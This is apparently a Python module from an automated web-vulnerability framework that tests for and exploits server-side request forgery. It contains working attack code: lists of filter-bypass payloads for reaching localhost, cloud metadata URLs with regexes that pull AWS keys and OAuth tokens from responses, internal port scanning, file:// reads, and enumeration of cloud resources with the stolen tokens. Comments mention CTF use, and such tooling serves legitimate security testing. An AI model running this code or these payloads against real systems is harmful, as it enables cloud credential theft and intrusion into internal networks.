"""SSRF (Server-Side Request Forgery) module for automated testing

This module implements:
- SSRF testing with localhost and internal IP ranges
- Multiple encoding schemes and bypass techniques
- Cloud metadata endpoint testing (AWS, Azure, GCP)
- Internal port scanning via SSRF
- Cloud service exploitation and enumeration
"""

import asyncio
import ipaddress
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple, Set
from urllib.parse import quote, quote_plus, urlparse

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine
from src.vulnchain.core.oob_listener import OOBListener
from src.vulnchain.models.target import TargetConfig


class SSRFType(Enum):
    """Types of SSRF techniques"""
    
    DIRECT = "direct"  # Direct SSRF with visible response
    BLIND_TIME = "blind_time"  # Time-based blind SSRF
    BLIND_OOB = "blind_oob"  # Out-of-band blind SSRF


class CloudProvider(Enum):
    """Cloud service providers"""
    
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    DIGITALOCEAN = "digitalocean"
    ALIBABA = "alibaba"


@dataclass
class InjectionPoint:
    """Represents a potential SSRF injection point"""
    
    parameter: str
    location: str  # query, post, header, cookie
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None


@dataclass
class SSRFResult:
    """Result of SSRF testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    ssrf_type: Optional[SSRFType] = None
    target_url: Optional[str] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    response_data: Optional[str] = None
    response_time: Optional[float] = None
    bypass_technique: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


@dataclass
class CloudMetadataResult:
    """Result of cloud metadata access"""
    
    provider: CloudProvider
    endpoint: str
    accessible: bool
    data: Optional[str] = None
    credentials: Optional[Dict] = None
    resources: List[str] = field(default_factory=list)


@dataclass
class PortScanResult:
    """Result of internal port scanning via SSRF"""
    
    host: str
    port: int
    is_open: bool
    service: Optional[str] = None
    response_time: float = 0.0
    banner: Optional[str] = None


class SSRFTester:
    """SSRF testing with filter bypasses and cloud exploitation"""
    
    # Cloud metadata endpoints
    CLOUD_METADATA_ENDPOINTS = {
        CloudProvider.AWS: [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ],
        CloudProvider.AZURE: [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        CloudProvider.GCP: [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        ],
        CloudProvider.DIGITALOCEAN: [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
        ],
        CloudProvider.ALIBABA: [
            "http://100.100.100.200/latest/meta-data/",
        ],
    }
    
    # Common internal IP ranges
    INTERNAL_IP_RANGES = [
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.0.1",
        "192.168.1.1",
    ]
    
    # Common internal ports to scan
    COMMON_PORTS = [
        21,    # FTP
        22,    # SSH
        23,    # Telnet
        25,    # SMTP
        80,    # HTTP
        443,   # HTTPS
        3306,  # MySQL
        5432,  # PostgreSQL
        6379,  # Redis
        8080,  # HTTP Alt
        8443,  # HTTPS Alt
        9200,  # Elasticsearch
        27017, # MongoDB
    ]
    
    def __init__(
        self,
        request_handler: RequestHandler,
        oob_listener: Optional[OOBListener] = None,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize SSRF tester
        
        Args:
            request_handler: Request handler for HTTP communication
            oob_listener: Optional OOB listener for blind SSRF detection
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.oob_listener = oob_listener
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default SSRF payloads"""
        # Basic localhost payloads
        localhost_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://127.1",
            "http://127.0.1",
        ]
        
        # Add payloads to engine
        for payload in localhost_payloads:
            self.payload_engine.add_custom_payload(payload, "ssrf_localhost")
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[SSRFType]] = None,
    ) -> List[SSRFResult]:
        """Test an injection point for SSRF
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of SSRF results
        """
        if techniques is None:
            techniques = list(SSRFType)
        
        results = []
        
        # Test each technique
        for technique in techniques:
            if technique == SSRFType.DIRECT:
                result = await self._test_direct_ssrf(injection_point)
            elif technique == SSRFType.BLIND_TIME:
                result = await self._test_time_based_blind(injection_point)
            elif technique == SSRFType.BLIND_OOB:
                if self.oob_listener:
                    result = await self._test_oob_blind(injection_point)
                else:
                    continue
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _test_direct_ssrf(
        self, injection_point: InjectionPoint
    ) -> Optional[SSRFResult]:
        """Test for direct SSRF with visible response
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SSRFResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        baseline_length = len(baseline_text)
        
        # Test localhost targets with various bypass techniques
        localhost_targets = self._generate_localhost_bypasses()
        
        for target_url, bypass_technique in localhost_targets:
            # Send request with SSRF payload
            response = await self._send_request(injection_point, target_url)
            response_text = response.text
            response_length = len(response_text)
            
            # Check for SSRF indicators
            is_ssrf, evidence = self._detect_ssrf_indicators(
                response_text,
                baseline_text,
                response_length,
                baseline_length,
            )
            
            if is_ssrf:
                return SSRFResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    ssrf_type=SSRFType.DIRECT,
                    target_url=target_url,
                    payload=target_url,
                    confidence=0.90,
                    response_data=response_text[:500],
                    bypass_technique=bypass_technique,
                    evidence=evidence + [
                        f"SSRF detected with bypass: {bypass_technique}",
                        f"Target URL: {target_url}",
                        f"Response length: {response_length}",
                        f"Baseline length: {baseline_length}",
                    ],
                )
        
        # No vulnerability found
        return SSRFResult(
            injection_point=injection_point,
            is_vulnerable=False,
            ssrf_type=SSRFType.DIRECT,
            confidence=0.0,
        )
    
    async def _test_time_based_blind(
        self, injection_point: InjectionPoint
    ) -> Optional[SSRFResult]:
        """Test for time-based blind SSRF
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SSRFResult if vulnerability found, None otherwise
        """
        # Measure baseline response time
        baseline_times = []
        for _ in range(3):
            start_time = time.time()
            await self._send_request(injection_point, injection_point.original_value)
            elapsed = time.time() - start_time
            baseline_times.append(elapsed)
            await asyncio.sleep(0.1)
        
        baseline_avg = sum(baseline_times) / len(baseline_times)
        
        # Test with non-routable IPs that should timeout
        timeout_targets = [
            "http://192.0.2.1",  # TEST-NET-1 (non-routable)
            "http://198.51.100.1",  # TEST-NET-2 (non-routable)
            "http://203.0.113.1",  # TEST-NET-3 (non-routable)
        ]
        
        for target_url in timeout_targets:
            # Send request with timeout target
            start_time = time.time()
            try:
                response = await self._send_request(injection_point, target_url)
                elapsed_time = time.time() - start_time
            except Exception:
                elapsed_time = time.time() - start_time
            
            # Check if response time indicates SSRF (should be significantly longer)
            if elapsed_time >= (baseline_avg + 5.0):
                return SSRFResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    ssrf_type=SSRFType.BLIND_TIME,
                    target_url=target_url,
                    payload=target_url,
                    confidence=0.75,
                    response_time=elapsed_time,
                    evidence=[
                        f"Time-based blind SSRF detected",
                        f"Target URL: {target_url}",
                        f"Response time: {elapsed_time:.2f}s",
                        f"Baseline: {baseline_avg:.2f}s",
                        f"Delay indicates server attempted connection",
                    ],
                    metadata={
                        "baseline_avg": baseline_avg,
                        "actual_delay": elapsed_time,
                    },
                )
        
        # No vulnerability found
        return SSRFResult(
            injection_point=injection_point,
            is_vulnerable=False,
            ssrf_type=SSRFType.BLIND_TIME,
            confidence=0.0,
        )
    
    async def _test_oob_blind(
        self, injection_point: InjectionPoint
    ) -> Optional[SSRFResult]:
        """Test for blind SSRF using OOB callbacks
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            SSRFResult if vulnerability found, None otherwise
        """
        if not self.oob_listener:
            return None
        
        # Generate unique OOB identifier
        unique_id = self.oob_listener.generate_unique_id()
        
        # Get OOB callback URLs
        http_url = self.oob_listener.get_callback_url(unique_id)
        dns_hostname = self.oob_listener.get_dns_callback(unique_id)
        
        # Test HTTP callback
        oob_payloads = [
            http_url,
            f"http://{dns_hostname}",
        ]
        
        for oob_url in oob_payloads:
            # Register payload with OOB listener
            await self.oob_listener.register_payload(
                unique_id=unique_id,
                payload=oob_url,
                target_url=injection_point.url,
                injection_point=injection_point.parameter,
                vulnerability_type="ssrf",
                metadata={"oob_url": oob_url},
            )
            
            # Send request with OOB payload
            response = await self._send_request(injection_point, oob_url)
            
            # Wait for OOB callback
            callback = await self.oob_listener.wait_for_callback(unique_id, timeout=10.0)
            
            if callback:
                # OOB callback received - SSRF confirmed!
                return SSRFResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    ssrf_type=SSRFType.BLIND_OOB,
                    target_url=oob_url,
                    payload=oob_url,
                    confidence=0.95,
                    evidence=[
                        f"OOB callback received - blind SSRF confirmed",
                        f"OOB URL: {oob_url}",
                        f"Callback type: {callback.callback_type}",
                        f"Source IP: {callback.source_ip}",
                        f"Callback ID: {callback.callback_id}",
                    ],
                    metadata={
                        "callback": {
                            "type": callback.callback_type,
                            "source_ip": callback.source_ip,
                            "timestamp": callback.timestamp.isoformat(),
                        },
                    },
                )
        
        # No vulnerability found
        return SSRFResult(
            injection_point=injection_point,
            is_vulnerable=False,
            ssrf_type=SSRFType.BLIND_OOB,
            confidence=0.0,
        )
    
    def _generate_localhost_bypasses(self) -> List[Tuple[str, str]]:
        """Generate localhost bypass payloads with various encoding techniques
        
        Returns:
            List of (payload, bypass_technique) tuples
        """
        bypasses = []
        
        # Basic localhost variations
        basic_targets = [
            ("http://127.0.0.1", "basic_localhost"),
            ("http://localhost", "basic_localhost"),
            ("http://0.0.0.0", "basic_localhost"),
        ]
        bypasses.extend(basic_targets)
        
        # IPv6 localhost
        ipv6_targets = [
            ("http://[::1]", "ipv6_localhost"),
            ("http://[0:0:0:0:0:0:0:1]", "ipv6_localhost_full"),
            ("http://[::ffff:127.0.0.1]", "ipv6_mapped_ipv4"),
        ]
        bypasses.extend(ipv6_targets)
        
        # Decimal/Octal/Hex IP encoding
        encoded_ips = [
            ("http://2130706433", "decimal_ip"),  # 127.0.0.1 in decimal
            ("http://0x7f000001", "hex_ip"),  # 127.0.0.1 in hex
            ("http://0177.0.0.1", "octal_ip"),  # 127.0.0.1 with octal
            ("http://127.1", "short_ip"),  # Short form
            ("http://127.0.1", "short_ip_2"),
        ]
        bypasses.extend(encoded_ips)
        
        # URL encoding bypasses
        url_encoded = [
            ("http://127.0.0.1", "url_encoded"),
            (quote("http://127.0.0.1", safe=""), "url_encoded_full"),
            ("http://%31%32%37%2e%30%2e%30%2e%31", "url_encoded_ip"),
        ]
        bypasses.extend(url_encoded)
        
        # Double encoding
        double_encoded = [
            (quote(quote("http://127.0.0.1", safe=""), safe=""), "double_url_encoded"),
        ]
        bypasses.extend(double_encoded)
        
        # DNS rebinding / alternative protocols
        alternative = [
            ("http://localtest.me", "dns_rebinding"),  # Resolves to 127.0.0.1
            ("http://127.0.0.1.nip.io", "nip_io_service"),
            ("http://127.0.0.1.xip.io", "xip_io_service"),
        ]
        bypasses.extend(alternative)
        
        # Case variation (for case-sensitive filters)
        case_variations = [
            ("http://LOCALHOST", "case_variation"),
            ("http://LocalHost", "case_variation_mixed"),
        ]
        bypasses.extend(case_variations)
        
        # Unicode/IDN bypasses
        unicode_bypasses = [
            ("http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", "unicode_circled"),
        ]
        bypasses.extend(unicode_bypasses)
        
        return bypasses
    
    def _detect_ssrf_indicators(
        self,
        response_text: str,
        baseline_text: str,
        response_length: int,
        baseline_length: int,
    ) -> Tuple[bool, List[str]]:
        """Detect SSRF indicators in response
        
        Args:
            response_text: Response text to analyze
            baseline_text: Baseline response text
            response_length: Length of response
            baseline_length: Length of baseline
        
        Returns:
            Tuple of (is_ssrf, evidence_list)
        """
        evidence = []
        
        # Check for significant length difference
        length_diff = abs(response_length - baseline_length)
        if length_diff > 100:
            evidence.append(f"Significant response length difference: {length_diff} bytes")
        
        # Check for internal service indicators
        internal_indicators = [
            r"<title>.*localhost.*</title>",
            r"Apache.*Server at",
            r"nginx.*server",
            r"IIS.*Windows Server",
            r"Welcome to.*default page",
            r"It works!",
            r"Index of /",
            r"Directory listing for",
            r"phpinfo\(\)",
            r"PHP Version",
            r"MySQL.*running",
            r"Redis.*server",
            r"Elasticsearch",
            r"MongoDB",
        ]
        
        for pattern in internal_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                evidence.append(f"Internal service indicator found: {pattern}")
        
        # Check for error messages indicating SSRF attempt
        error_indicators = [
            r"Connection refused",
            r"Connection timed out",
            r"No route to host",
            r"Network is unreachable",
            r"Could not resolve host",
        ]
        
        for pattern in error_indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                # These errors indicate the server tried to make a connection
                evidence.append(f"Connection attempt indicator: {pattern}")
        
        # If we have evidence, it's likely SSRF
        return len(evidence) > 0, evidence
    
    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value
        
        Args:
            injection_point: The injection point
            value: The value to inject
        
        Returns:
            Response object
        """
        if injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )
        
        elif injection_point.location == "post":
            # Inject into POST data
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )
        
        elif injection_point.location == "header":
            # Inject into header
            headers = injection_point.headers.copy()
            headers[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=injection_point.data,
            )
        
        elif injection_point.location == "cookie":
            # Inject into cookie
            cookies = {injection_point.parameter: value}
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                cookies=cookies,
                data=injection_point.data,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")

    
    async def scan_internal_ports(
        self,
        injection_point: InjectionPoint,
        target_host: str = "127.0.0.1",
        ports: Optional[List[int]] = None,
    ) -> List[PortScanResult]:
        """Enumerate accessible ports via SSRF
        
        Args:
            injection_point: The vulnerable injection point
            target_host: Target host to scan (default: localhost)
            ports: List of ports to scan (default: common ports)
        
        Returns:
            List of port scan results
        """
        if ports is None:
            ports = self.COMMON_PORTS
        
        results = []
        
        # Test each port
        for port in ports:
            target_url = f"http://{target_host}:{port}"
            
            # Measure response time
            start_time = time.time()
            try:
                response = await self._send_request(injection_point, target_url)
                elapsed_time = time.time() - start_time
                
                # Analyze response to determine if port is open
                is_open, service, banner = self._analyze_port_response(
                    response, port
                )
                
                result = PortScanResult(
                    host=target_host,
                    port=port,
                    is_open=is_open,
                    service=service,
                    response_time=elapsed_time,
                    banner=banner,
                )
                results.append(result)
                
            except Exception as e:
                # Port likely closed or filtered
                result = PortScanResult(
                    host=target_host,
                    port=port,
                    is_open=False,
                    response_time=time.time() - start_time,
                )
                results.append(result)
            
            # Small delay to avoid overwhelming the target
            await asyncio.sleep(0.1)
        
        return results
    
    def _analyze_port_response(
        self, response: Response, port: int
    ) -> Tuple[bool, Optional[str], Optional[str]]:
        """Analyze response to determine if port is open and identify service
        
        Args:
            response: Response from port probe
            port: Port number
        
        Returns:
            Tuple of (is_open, service_name, banner)
        """
        # Check status code
        if response.status_code == 0:
            # Connection failed
            return False, None, None
        
        # Port is likely open if we got any response
        is_open = True
        
        # Try to identify service from response
        service = self._identify_service(response.text, port)
        
        # Extract banner (first 200 chars of response)
        banner = response.text[:200] if response.text else None
        
        return is_open, service, banner
    
    def _identify_service(self, response_text: str, port: int) -> Optional[str]:
        """Identify service from response text and port
        
        Args:
            response_text: Response text
            port: Port number
        
        Returns:
            Service name if identified
        """
        # Port-based identification
        port_services = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            80: "HTTP",
            443: "HTTPS",
            3306: "MySQL",
            5432: "PostgreSQL",
            6379: "Redis",
            8080: "HTTP",
            8443: "HTTPS",
            9200: "Elasticsearch",
            27017: "MongoDB",
        }
        
        # Content-based identification
        content_patterns = {
            "SSH": r"SSH-\d+\.\d+",
            "FTP": r"220.*FTP",
            "SMTP": r"220.*SMTP",
            "HTTP": r"<html|<!DOCTYPE",
            "MySQL": r"mysql.*protocol",
            "PostgreSQL": r"PostgreSQL",
            "Redis": r"-ERR|PONG",
            "Elasticsearch": r"elasticsearch",
            "MongoDB": r"MongoDB",
        }
        
        # Try content-based first
        for service, pattern in content_patterns.items():
            if re.search(pattern, response_text, re.IGNORECASE):
                return service
        
        # Fall back to port-based
        return port_services.get(port)
    
    async def test_cloud_metadata(
        self,
        injection_point: InjectionPoint,
        providers: Optional[List[CloudProvider]] = None,
    ) -> List[CloudMetadataResult]:
        """Test access to cloud metadata endpoints
        
        Args:
            injection_point: The vulnerable injection point
            providers: List of cloud providers to test (default: all)
        
        Returns:
            List of cloud metadata results
        """
        if providers is None:
            providers = list(CloudProvider)
        
        results = []
        
        for provider in providers:
            endpoints = self.CLOUD_METADATA_ENDPOINTS.get(provider, [])
            
            for endpoint in endpoints:
                # Add required headers for some providers
                headers = self._get_cloud_metadata_headers(provider)
                
                # Temporarily add headers to injection point
                original_headers = injection_point.headers.copy()
                injection_point.headers.update(headers)
                
                try:
                    # Send request to metadata endpoint
                    response = await self._send_request(injection_point, endpoint)
                    
                    # Check if metadata is accessible
                    is_accessible = self._is_metadata_accessible(response, provider)
                    
                    if is_accessible:
                        # Parse metadata
                        data = response.text
                        credentials = self._extract_credentials(data, provider)
                        
                        result = CloudMetadataResult(
                            provider=provider,
                            endpoint=endpoint,
                            accessible=True,
                            data=data[:1000],  # First 1000 chars
                            credentials=credentials,
                        )
                        results.append(result)
                    else:
                        result = CloudMetadataResult(
                            provider=provider,
                            endpoint=endpoint,
                            accessible=False,
                        )
                        results.append(result)
                
                except Exception as e:
                    result = CloudMetadataResult(
                        provider=provider,
                        endpoint=endpoint,
                        accessible=False,
                    )
                    results.append(result)
                
                finally:
                    # Restore original headers
                    injection_point.headers = original_headers
                
                # Small delay between requests
                await asyncio.sleep(0.2)
        
        return results
    
    def _get_cloud_metadata_headers(self, provider: CloudProvider) -> Dict[str, str]:
        """Get required headers for cloud metadata access
        
        Args:
            provider: Cloud provider
        
        Returns:
            Dictionary of headers
        """
        headers = {}
        
        if provider == CloudProvider.AZURE:
            headers["Metadata"] = "true"
        elif provider == CloudProvider.GCP:
            headers["Metadata-Flavor"] = "Google"
        
        return headers
    
    def _is_metadata_accessible(
        self, response: Response, provider: CloudProvider
    ) -> bool:
        """Check if metadata endpoint is accessible
        
        Args:
            response: Response from metadata endpoint
            provider: Cloud provider
        
        Returns:
            True if accessible
        """
        # Check status code
        if response.status_code not in [200, 201]:
            return False
        
        # Check for provider-specific indicators
        indicators = {
            CloudProvider.AWS: [
                "ami-id",
                "instance-id",
                "instance-type",
                "security-credentials",
            ],
            CloudProvider.AZURE: [
                "compute",
                "vmId",
                "subscriptionId",
            ],
            CloudProvider.GCP: [
                "project-id",
                "instance-id",
                "service-accounts",
            ],
            CloudProvider.DIGITALOCEAN: [
                "droplet_id",
                "hostname",
            ],
            CloudProvider.ALIBABA: [
                "instance-id",
                "region-id",
            ],
        }
        
        provider_indicators = indicators.get(provider, [])
        response_text = response.text.lower()
        
        # Check if any indicator is present
        for indicator in provider_indicators:
            if indicator.lower() in response_text:
                return True
        
        return False
    
    def _extract_credentials(
        self, data: str, provider: CloudProvider
    ) -> Optional[Dict]:
        """Extract credentials from metadata response
        
        Args:
            data: Metadata response data
            provider: Cloud provider
        
        Returns:
            Dictionary of credentials if found
        """
        credentials = {}
        
        if provider == CloudProvider.AWS:
            # Extract AWS credentials
            access_key_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', data)
            secret_key_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', data)
            token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', data)
            
            if access_key_match:
                credentials["access_key_id"] = access_key_match.group(1)
            if secret_key_match:
                credentials["secret_access_key"] = secret_key_match.group(1)
            if token_match:
                credentials["token"] = token_match.group(1)
        
        elif provider == CloudProvider.AZURE:
            # Extract Azure access token
            token_match = re.search(r'"access_token"\s*:\s*"([^"]+)"', data)
            if token_match:
                credentials["access_token"] = token_match.group(1)
        
        elif provider == CloudProvider.GCP:
            # Extract GCP access token
            token_match = re.search(r'"access_token"\s*:\s*"([^"]+)"', data)
            if token_match:
                credentials["access_token"] = token_match.group(1)
        
        return credentials if credentials else None
    
    async def enumerate_cloud_resources(
        self,
        injection_point: InjectionPoint,
        provider: CloudProvider,
        credentials: Dict,
    ) -> List[str]:
        """Enumerate accessible cloud resources
        
        Args:
            injection_point: The vulnerable injection point
            provider: Cloud provider
            credentials: Cloud credentials
        
        Returns:
            List of accessible resources
        """
        resources = []
        
        if provider == CloudProvider.AWS:
            resources = await self._enumerate_aws_resources(
                injection_point, credentials
            )
        elif provider == CloudProvider.AZURE:
            resources = await self._enumerate_azure_resources(
                injection_point, credentials
            )
        elif provider == CloudProvider.GCP:
            resources = await self._enumerate_gcp_resources(
                injection_point, credentials
            )
        
        return resources
    
    async def _enumerate_aws_resources(
        self,
        injection_point: InjectionPoint,
        credentials: Dict,
    ) -> List[str]:
        """Enumerate AWS resources
        
        Args:
            injection_point: The vulnerable injection point
            credentials: AWS credentials
        
        Returns:
            List of accessible resources
        """
        resources = []
        
        # Common AWS endpoints to test
        aws_endpoints = [
            "https://s3.amazonaws.com/",  # S3 buckets
            "https://ec2.amazonaws.com/",  # EC2 instances
            "https://rds.amazonaws.com/",  # RDS databases
            "https://dynamodb.amazonaws.com/",  # DynamoDB tables
        ]
        
        # Note: Full enumeration would require AWS SDK and proper authentication
        # This is a simplified version for CTF scenarios
        
        for endpoint in aws_endpoints:
            try:
                response = await self._send_request(injection_point, endpoint)
                if response.status_code == 200:
                    resources.append(endpoint)
            except Exception:
                pass
        
        return resources
    
    async def _enumerate_azure_resources(
        self,
        injection_point: InjectionPoint,
        credentials: Dict,
    ) -> List[str]:
        """Enumerate Azure resources
        
        Args:
            injection_point: The vulnerable injection point
            credentials: Azure credentials
        
        Returns:
            List of accessible resources
        """
        resources = []
        
        # Common Azure endpoints
        azure_endpoints = [
            "https://management.azure.com/subscriptions",
            "https://storage.azure.com/",
        ]
        
        # Note: Full enumeration would require Azure SDK
        # This is a simplified version for CTF scenarios
        
        for endpoint in azure_endpoints:
            try:
                # Add authorization header
                headers = {"Authorization": f"Bearer {credentials.get('access_token', '')}"}
                original_headers = injection_point.headers.copy()
                injection_point.headers.update(headers)
                
                response = await self._send_request(injection_point, endpoint)
                if response.status_code == 200:
                    resources.append(endpoint)
                
                injection_point.headers = original_headers
            except Exception:
                pass
        
        return resources
    
    async def _enumerate_gcp_resources(
        self,
        injection_point: InjectionPoint,
        credentials: Dict,
    ) -> List[str]:
        """Enumerate GCP resources
        
        Args:
            injection_point: The vulnerable injection point
            credentials: GCP credentials
        
        Returns:
            List of accessible resources
        """
        resources = []
        
        # Common GCP endpoints
        gcp_endpoints = [
            "https://storage.googleapis.com/storage/v1/b",  # Storage buckets
            "https://compute.googleapis.com/compute/v1/projects",  # Compute instances
        ]
        
        # Note: Full enumeration would require GCP SDK
        # This is a simplified version for CTF scenarios
        
        for endpoint in gcp_endpoints:
            try:
                # Add authorization header
                headers = {"Authorization": f"Bearer {credentials.get('access_token', '')}"}
                original_headers = injection_point.headers.copy()
                injection_point.headers.update(headers)
                
                response = await self._send_request(injection_point, endpoint)
                if response.status_code == 200:
                    resources.append(endpoint)
                
                injection_point.headers = original_headers
            except Exception:
                pass
        
        return resources
    
    async def test_iam_privilege_escalation(
        self,
        injection_point: InjectionPoint,
        provider: CloudProvider,
        credentials: Dict,
    ) -> Dict:
        """Test for privilege escalation via IAM misconfigurations
        
        Args:
            injection_point: The vulnerable injection point
            provider: Cloud provider
            credentials: Cloud credentials
        
        Returns:
            Dictionary with privilege escalation findings
        """
        findings = {
            "provider": provider.value,
            "vulnerable": False,
            "escalation_paths": [],
            "permissions": [],
        }
        
        if provider == CloudProvider.AWS:
            # Test common AWS privilege escalation paths
            escalation_tests = [
                {
                    "name": "iam:CreateAccessKey",
                    "description": "Can create access keys for other users",
                },
                {
                    "name": "iam:AttachUserPolicy",
                    "description": "Can attach policies to users",
                },
                {
                    "name": "iam:PutUserPolicy",
                    "description": "Can put inline policies on users",
                },
                {
                    "name": "lambda:UpdateFunctionCode",
                    "description": "Can update Lambda function code",
                },
            ]
            
            # Note: Full testing would require AWS SDK
            # This is a placeholder for CTF scenarios
            findings["escalation_paths"] = escalation_tests
        
        elif provider == CloudProvider.AZURE:
            # Test common Azure privilege escalation paths
            escalation_tests = [
                {
                    "name": "Microsoft.Authorization/roleAssignments/write",
                    "description": "Can assign roles to principals",
                },
                {
                    "name": "Microsoft.Compute/virtualMachines/extensions/write",
                    "description": "Can write VM extensions",
                },
            ]
            
            findings["escalation_paths"] = escalation_tests
        
        elif provider == CloudProvider.GCP:
            # Test common GCP privilege escalation paths
            escalation_tests = [
                {
                    "name": "iam.serviceAccountKeys.create",
                    "description": "Can create service account keys",
                },
                {
                    "name": "iam.roles.update",
                    "description": "Can update IAM roles",
                },
            ]
            
            findings["escalation_paths"] = escalation_tests
        
        return findings


class SSRFExploiter:
    """Helper class for exploiting confirmed SSRF vulnerabilities"""
    
    def __init__(
        self,
        request_handler: RequestHandler,
        injection_point: InjectionPoint,
        ssrf_result: SSRFResult,
    ):
        """Initialize SSRF exploiter
        
        Args:
            request_handler: Request handler for HTTP communication
            injection_point: The vulnerable injection point
            ssrf_result: The confirmed SSRF result
        """
        self.request_handler = request_handler
        self.injection_point = injection_point
        self.ssrf_result = ssrf_result
        self.tester = SSRFTester(request_handler)
    
    async def read_file(self, file_path: str) -> Optional[str]:
        """Read a file via SSRF using file:// protocol
        
        Args:
            file_path: Path to file to read
        
        Returns:
            File contents if successful
        """
        file_url = f"file://{file_path}"
        
        try:
            response = await self.tester._send_request(
                self.injection_point, file_url
            )
            return response.text
        except Exception:
            return None
    
    async def scan_network(
        self, ip_range: str, ports: Optional[List[int]] = None
    ) -> List[PortScanResult]:
        """Scan internal network via SSRF
        
        Args:
            ip_range: IP range to scan (e.g., "192.168.1.0/24")
            ports: List of ports to scan
        
        Returns:
            List of port scan results
        """
        results = []
        
        # Parse IP range
        network = ipaddress.ip_network(ip_range, strict=False)
        
        # Scan each host (limit to first 10 for performance)
        for i, ip in enumerate(network.hosts()):
            if i >= 10:  # Limit scan
                break
            
            host_results = await self.tester.scan_internal_ports(
                self.injection_point,
                str(ip),
                ports,
            )
            results.extend(host_results)
        
        return results
    
    async def exploit_cloud(
        self, provider: CloudProvider
    ) -> Optional[CloudMetadataResult]:
        """Exploit cloud metadata service
        
        Args:
            provider: Cloud provider to target
        
        Returns:
            CloudMetadataResult if successful
        """
        results = await self.tester.test_cloud_metadata(
            self.injection_point,
            [provider],
        )
        
        # Return first accessible result
        for result in results:
            if result.accessible:
                return result
        
        return None
